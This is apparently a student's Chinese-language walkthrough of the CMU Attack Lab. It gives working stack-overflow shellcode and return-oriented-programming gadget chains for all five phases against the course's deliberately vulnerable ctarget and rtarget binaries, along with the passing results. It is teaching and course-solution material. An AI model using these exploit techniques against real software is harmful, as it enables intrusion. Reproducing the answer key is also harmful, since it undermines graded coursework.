# Attack Lab實驗紀錄

## Intro

This file contains materials for one instance of the **attacklab**.

Files:

```bash
ctarget
```

Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.

    rtarget

Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.

```bash
 cookie.txt
```

Text file containing 4-byte signature required for this lab instance.

```bash
 farm.c
```

Source code for gadget farm present in this instance of `rtarget`.  You
can compile (use flag `-Og`) and disassemble it to look for gadgets.

```bash
 hex2raw
```

Utility program to generate byte sequences.  See documentation in lab
handout.

> 開始實驗前請先閱讀attacklab.pdf文檔

## Part I: Code Injection Attacks

### Level 1

Level 1的目的是對`test`進行注入攻擊，將原先`ret`返回地址的導向`touch1()`函式

先查看原先的程式碼:

```c
void test(){
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

然後我們看看`getbuf()`的實現，其實他的功能類似於`gets()`，直到遇上`\n`或`EOF`停止，這點適合我們進行攻擊

```c
unsigned getbuf(){
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

透過`./ctarget -q`執行`ctarget`後藉由輸入字串進行注入攻擊

```c
void touch1(){
    vlevel = 1;
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

使用`objdump -d ./ctarget > ctarget.s`反組譯`catarget`

`test()`的組合語言程式碼:

```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	callq  400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	retq 
```

`getbuf()`的組合語言程式碼:

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq 
```

`touch1()`的組合語言程式碼:

```asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

從上面的結果不難推測出，最終要將返回地址複寫成`0x 00 00 00 00 00 40 17 c0`，此處要特別注意機器是大端還是小端

所以調用`getbuf()`後棧的狀態類似:

![](https://raw.githubusercontent.com/WeiLin66/pictures/main/202207230811203.png)



我們需要填充40個任意字元，然後再依序填入`c0 17 40 00 00 00 00 00`

官方文件有提到`HEX2TRAW`可以將文件中的hex值轉換成字元(用空白鍵區分)，然後將字串內容輸入給`ctarget`。因此只需要將

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

另存成`touch1.txt`(名字自己取)，然後執行`./hex2raw < touch1.txt | ./ctarget -q`語句就可以了

```
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

### Level 2

Level 2不僅要我們進行注入攻擊，還需要傳入參數`val`來達到特殊目的

首先我們來看`touch2`的C與asm程式碼，需要使得條件`val == cookie`成立，才能成功通過

>  `cookie`位於檔案cookie.txt中，其值為`0x59b997fa`

```c
void touch2(unsigned val){
    vlevel = 2;
    if(val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    }else{
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

```asm
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

有此可知，我們可以總結出:

- 不能直接跳轉到`touch2`
- 需要修改`%rdi`值(首參數)
- 需要在將程式碼透過字串方式注入到棧分配的空間中
- 需要知道程式碼的字節碼型式

首先，我們需要知道返回地址前的`%rsp`地址，目的是為了知道輸入字串的儲存位置

透過`gdb ./ctarget`進行gdb除錯，然後`b main` ,`b test`上斷點後執行`r -q`開始跟蹤代碼。進入`getbuf()`函式，並打印其暫存器資訊，可以發現棧地址的變化`0x5561dca0` &rarr; `0x5561dc78`

因此我們可以在棧中設計整個攻擊流程: **反回到原先棧分配的空間中，執行我們注入的程式碼，最後再返回**`touch2`

![](https://raw.githubusercontent.com/WeiLin66/pictures/main/202207230831869.png)





有了這個想法，就可以清楚的設計注入程式碼:

```asm
movl $0x59b997fa, %edi
pushq $0x4017ec
ret
```

將上述程式碼儲存成`test.s`然後透過組譯再反組譯得到字節碼

- `gcc -c test.s`
- `objdump -d test.s > test.d`

```
test.o      檔案格式 elf64-x86-64


.text 區段的反組譯：

0000000000000000 <.text>:
   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   5:	68 ec 17 40 00       	pushq  $0x4017ec
   a:	c3                   	retq   
```

```
bf fa 97 b9 59 68 ec 17 
40 00 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

最後只要將字節碼寫入`touch2.txt`中，然後`./hex2raw < touch2.txt | ./ctarget -q`執行就可以順利通過

> 注意地址與字節碼的順序

```
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 

```



### Level 3

Level 3與Level 2類似，都要求藉由注入將參數傳入特定函式，只不過Level 3參數為字串類型。目標跳轉函式為`touch3`，其中`touch3`中又調用了`hexmatch`:

```c
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    char *s = cbuf + random()%100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval){
    vlevel = 3;
    if(hexmatch(cookie, sval)){
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    }else{
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

照慣例我們將C代碼轉換成組合語言:

```asm
000000000040184c <hexmatch>:
  40184c:	41 54                	push   %r12
  40184e:	55                   	push   %rbp
  40184f:	53                   	push   %rbx
  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  401854:	41 89 fc             	mov    %edi,%r12d
  401857:	48 89 f5             	mov    %rsi,%rbp
  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401861:	00 00 
  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  401868:	31 c0                	xor    %eax,%eax
  40186a:	e8 41 f5 ff ff       	callq  400db0 <random@plt>
  40186f:	48 89 c1             	mov    %rax,%rcx
  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  401879:	0a d7 a3 
  40187c:	48 f7 ea             	imul   %rdx
  40187f:	48 01 ca             	add    %rcx,%rdx
  401882:	48 c1 fa 06          	sar    $0x6,%rdx
  401886:	48 89 c8             	mov    %rcx,%rax
  401889:	48 c1 f8 3f          	sar    $0x3f,%rax
  40188d:	48 29 c2             	sub    %rax,%rdx
  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  401898:	48 c1 e0 02          	shl    $0x2,%rax
  40189c:	48 29 c1             	sub    %rax,%rcx
  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
  4018a3:	45 89 e0             	mov    %r12d,%r8d
  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx
  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  4018b2:	be 01 00 00 00       	mov    $0x1,%esi
  4018b7:	48 89 df             	mov    %rbx,%rdi
  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax
  4018bf:	e8 ac f5 ff ff       	callq  400e70 <__sprintf_chk@plt>
  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx
  4018c9:	48 89 de             	mov    %rbx,%rsi
  4018cc:	48 89 ef             	mov    %rbp,%rdi
  4018cf:	e8 cc f3 ff ff       	callq  400ca0 <strncmp@plt>
  4018d4:	85 c0                	test   %eax,%eax
  4018d6:	0f 94 c0             	sete   %al
  4018d9:	0f b6 c0             	movzbl %al,%eax
  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
  4018e8:	00 00 
  4018ea:	74 05                	je     4018f1 <hexmatch+0xa5>
  4018ec:	e8 ef f3 ff ff       	callq  400ce0 <__stack_chk_fail@plt>
  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
  4018f5:	5b                   	pop    %rbx
  4018f6:	5d                   	pop    %rbp
  4018f7:	41 5c                	pop    %r12
  4018f9:	c3                   	retq   
```

```asm
00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:	00 00 00 
  401908:	48 89 fe             	mov    %rdi,%rsi
  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>
  401916:	85 c0                	test   %eax,%eax
  401918:	74 23                	je     40193d <touch3+0x43>
  40191a:	48 89 da             	mov    %rbx,%rdx
  40191d:	be 38 31 40 00       	mov    $0x403138,%esi
  401922:	bf 01 00 00 00       	mov    $0x1,%edi
  401927:	b8 00 00 00 00       	mov    $0x0,%eax
  40192c:	e8 bf f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401931:	bf 03 00 00 00       	mov    $0x3,%edi
  401936:	e8 52 03 00 00       	callq  401c8d <validate>
  40193b:	eb 21                	jmp    40195e <touch3+0x64>
  40193d:	48 89 da             	mov    %rbx,%rdx
  401940:	be 60 31 40 00       	mov    $0x403160,%esi
  401945:	bf 01 00 00 00       	mov    $0x1,%edi
  40194a:	b8 00 00 00 00       	mov    $0x0,%eax
  40194f:	e8 9c f4 ff ff       	callq  400df0 <__printf_chk@plt>
  401954:	bf 03 00 00 00       	mov    $0x3,%edi
  401959:	e8 f1 03 00 00       	callq  401d4f <fail>
  40195e:	bf 00 00 00 00       	mov    $0x0,%edi
  401963:	e8 d8 f4 ff ff       	callq  400e40 <exit@plt>
```

整體思路跟Level 2很像，我們只要將返回地址改寫，然後將指定參數複製到`%rdi`中，但官方文件上的這句話很耐人尋味

> When functions `hexmatch` and `strncmp` are called, they push data onto the stack, overwriting
> portions of memory that held the buffer used by `getbuf`. As a result, you will need to be careful
> where you place the string representation of your cookie.



當調用`touch3`,  `hexmatch`,  `strncmp`時，原先透過`buf`存放在棧空間上的代碼可能無預警的被覆寫(作為其他函式的局部變數、暫存器、參數等等)

也就是說Level 3的重點在於目標字串**該放在哪裡**才不會被影響



從Level 2得知`getbuf()`過程中棧的變化為`0x5561dca0` &rarr; `0x5561dc78`&rarr;`0x5561dca0`，也就是說透過`ret`跳轉時的棧地址為`0x5561dca0`，我們先假設注入代碼成功將字串地址傳給`%rdi`，然後跳轉到`touch3`

過程中會遇到一些`strncmp()`、返回地址保存與callee-save的入棧操作，這些操作直接影響我們輸入字串的倒數幾個字元

然後`hexmatch`中的`cbuf[110]`更是如此，它的組語指令`add    $0xffffffffffffff80,%rsp`直接使`%rsp`無符號溢出，其實作用就是將`%rsp`向下減去`0x80`

總和上述兩個操作，若將字串存放在`0x5561dca0` ~`0x5561dc78`區間中，代碼將會被污染。唯一的解法就是將字串存放在這個範圍以外

綜觀`getbuf()`跳到`touch3`這個過程，只有在函式結束時會將`%rsp`向上調整，也就是說在`strncmp()`比較過程中，`0x5561dca0`**以上的棧空間基本上是安全的**，我們需要將字串存放在這裡



![](https://raw.githubusercontent.com/WeiLin66/pictures/main/202207231213998.png)



接著編寫注入代碼，將字串地址存到`%rdi`中，然後將`touch3`地址入棧並返回。這裡過程跟Level 2一樣，將結果轉成字節碼

```asm
movq $0x5561dca8, %rdi
pushq $0x4018fa
ret
```

```
test.o      檔案格式 elf64-x86-64


.text 區段的反組譯：

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq 
```

最後把字節碼依序填入`touch3.txt`中，保存後執行`./hex2raw < touch3.txt | ./ctarget -q`語句

```
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

成功通過測試

```
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
```



## Part II: Return-Oriented Programming

Part II要求我們執行`rtarget`，並將函式引導到指定函適中，整體過程與前面幾個phase相似，不過由於可執行區的限制，我們不能直接執行注入的字串，而要使用ROP的方式將程式導向已存在並編譯過的內部程式

我們必須使用已存在的函式巧妙的完成目的。我們可以把一條語句的字節碼形式切分成`c3`結尾的指令(文檔稱之為`gadget`)，藉此組合出完全不同功能

首先將`rtarget`反組譯成`rtarget.s`，在`stasrt_farm`~`end_farm`區間中可以找到測試用函式(來自`farm.c`)

```asm
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   

00000000004019e1 <setval_296>:
  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
  4019e7:	c3                   	retq   

00000000004019e8 <addval_113>:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	retq   

00000000004019ef <addval_490>:
  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
  4019f5:	c3                   	retq   

00000000004019f6 <getval_226>:
  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
  4019fb:	c3                   	retq   

00000000004019fc <setval_384>:
  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
  401a02:	c3                   	retq   

0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   

0000000000401a0a <setval_276>:
  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
  401a10:	c3                   	retq   

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   

0000000000401a18 <getval_345>:
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	retq   

0000000000401a1e <addval_479>:
  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  401a24:	c3                   	retq   

0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	retq   

0000000000401a2c <setval_248>:
  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
  401a32:	c3                   	retq   

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq   

0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq   

0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq   

0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	retq   

0000000000401a4e <getval_272>:
  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
  401a53:	c3                   	retq   

0000000000401a54 <getval_155>:
  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
  401a59:	c3                   	retq   

0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	retq   

0000000000401a61 <addval_404>:
  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
  401a67:	c3                   	retq   

0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq   

0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	retq   

0000000000401a75 <setval_328>:
  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
  401a7b:	c3                   	retq   

0000000000401a7c <setval_450>:
  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
  401a82:	c3                   	retq   

0000000000401a83 <addval_358>:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	retq   

0000000000401a8a <addval_124>:
  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
  401a90:	c3                   	retq   

0000000000401a91 <getval_169>:
  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
  401a96:	c3                   	retq   

0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	retq   

0000000000401a9e <addval_184>:
  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
  401aa4:	c3                   	retq   

0000000000401aa5 <getval_472>:
  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
  401aaa:	c3                   	retq   

0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq   

0000000000401ab2 <end_farm>:
  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
  401ab7:	c3                   	retq   
```



> attacklab.pdf中有羅列出各種指令的字節表達方式，我們要想辦法在`rtarget.s`中找出它們



### Level 4 

Phase 4要求我們調用 `touch2`，並將`%rdi`賦值成`0x59b997fa`

```c
void touch2(unsigned val){
    vlevel = 2;
    if(val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    }else{
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

由此可知整體操作大致需要:

1. `popq 某暫存器`
2. `movq 某暫存器 %rdi`(因為`popq %rdi`在`rtarget.s`中不存在)
3. 返回`touch2`



查找相應的`gadgets`，發現可以先暫存到`%rax`

```asm
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
```

順著這個思路編寫`touch4.txt`

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 -> popq %rax
fa 97 b9 59 00 00 00 00 -> 59b997fa
a2 19 40 00 00 00 00 00 -> movq %rax %rdi
ec 17 40 00 00 00 00 00 -> touch2
```

運行結果

```
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 

```



### Level 5

Phase 5要求我們調用 `touch3`，並將`%rdi`賦值成字串`59b997fa`的地址

```c
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    char *s = cbuf + random()%100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval){
    vlevel = 3;
    if(hexmatch(cookie, sval)){
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    }else{
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

由此可知整體操作大致需要:

1. 取得`%rsp`地址
2. 取得字串地址相對於`%rsp`的**偏移量**
3. 將地址存放到`%rdi`
4. 調用`touch3`

> Phase 5麻煩的點在於，某些暫存器操作的`gadget`在`rtarget.s`找不到，需要先存放到其他暫存器中

Phase 5建議先把所有語句都寫出來，最後在計算偏移量，然後過程中可能會發現設計的語句在`farm`區不存在，例如`movl %eax, %esi`

接著我們編寫`touch5.txt`

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 -> movq %rsp, %rax 取出棧地址(注意這個棧地址是c5 19 40 00 00 00 00 00這行)
c5 19 40 00 00 00 00 00 -> movq %rax, %rdi
ab 19 40 00 00 00 00 00 -> popq %rax
48 00 00 00 00 00 00 00 -> 偏移量(0x48/0x8=0x9，棧地址向下9行)
42 1a 40 00 00 00 00 00 -> movl %eax, %edx
34 1a 40 00 00 00 00 00 -> movl %edx, %ecx
13 1a 40 00 00 00 00 00 -> movl %ecx, %esi
d6 19 40 00 00 00 00 00 -> lea(%rdi, %rsi, 1), %rax 直接使用add_xy
a2 19 40 00 00 00 00 00 -> movq %rax, %rdi
fa 18 40 00 00 00 00 00 -> touch3
35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
```

執行結果

```
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 42 1A 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 
```

